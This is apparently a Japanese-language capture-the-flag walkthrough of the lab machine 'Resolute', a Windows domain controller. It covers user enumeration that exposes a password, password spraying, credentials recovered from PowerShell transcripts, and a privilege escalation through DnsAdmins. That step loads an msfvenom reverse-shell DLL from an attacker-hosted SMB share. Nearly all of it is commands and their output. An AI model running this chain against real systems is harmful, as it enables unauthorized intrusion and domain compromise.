# Recon

`enum4linux`の結果をよくみると、ユーザmarkoのパスワードを発見：

```
┌──(shoebill㉿shoebill)-[~]
└─$  enum4linux -a -M -l -d 10.10.10.169
...
        User Name   :   marko
        Full Name   :   Marko Novak
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Account created. Password set to Welcome123!
        Workstations:
        Comment     :
...
```

# initial shell

残念ながらmarkoのシェルがとれなかったので、パスワードの使い回しを疑って次のように`kerbrute`を実行：

```
┌──(shoebill㉿shoebill)-[~/Resolute_10.10.10.169]
└─$ crackmapexec smb 10.10.10.169 -u users.txt -d megabank.local -p 'Welcome123!'
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
...
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123!
```

ユーザmelanieのパスワードもWelcome123!と判明。

次のようにしてmelanieのシェルをゲット：

```
┌──(shoebill㉿shoebill)-[~/Resolute_10.10.10.169]
└─$ evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'
...
*Evil-WinRM* PS C:\Users\melanie\Documents> whoami
megabank\melanie
```

# Privesc

ルートフォルダに怪しいフォルダ・ファイルを発見：
```
*Evil-WinRM* PS C:\> ls -force 

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-       10/20/2022  10:23 PM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
...
*Evil-WinRM* PS C:\> ls -force PSTranscripts


    Directory: C:\PSTranscripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        12/3/2019   6:45 AM                20191203
```

中身をのぞくと、ユーザryanのパスワードと思われる文字列を発見：

```
*Evil-WinRM* PS C:\> cat PSTranscripts\20191203
...
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
...
```

このパスワードを使ってryanのシェルをゲット：
```
┌──(shoebill㉿shoebill)-[~/Resolute_10.10.10.169]
└─$ evil-winrm -i 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'
...
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami
megabank\ryan
```

ryanはDnsAdminsグループに属してる：
```
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
...
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins 
...
```

```
*Evil-WinRM* PS C:\Users\ryan> .\accesschk.exe -ucqv dns

dns
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
           ...
  R  MEGABANK\ryan
        SERVICE_QUERY_STATUS
        SERVICE_INTERROGATE
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```

DNSの設定および再起動ができる権限があるので、DNSの"serverlevelplugindll"というパラメータにリバースシェルを起動するようなdllファイルを読み込ませる酔うに設定してやる。

dllの作成：

```
┌──(shoebill㉿shoebill)-[~]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.4 LPORT=443 -f dll -o rev.dll
```
（`windows/shell_reverse_tcp`のペイロードではうまくいかなかった）

このrev.dllのあるディレクトリ上でSMBサーバを立てる：

```
┌──(shoebill㉿shoebill)-[~]
└─$ impacket-smbserver kali . -smb2support
```
加えて、リバースシェルのためのリスナーを準備しておく：

```
┌──(shoebill㉿shoebill)-[~]
└─$ rlwrap nc -nvlp 443
```

次にWindows側でDNSの設定をする。以下のように先に作成したdllをしていする：

```
*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd.exe /config /serverlevelplugindll \\10.10.16.4\kali\rev.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```
あとはこのDNSサービスを再起動すればリバースシェルが起動する：

```
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2144
        FLAGS              :
```
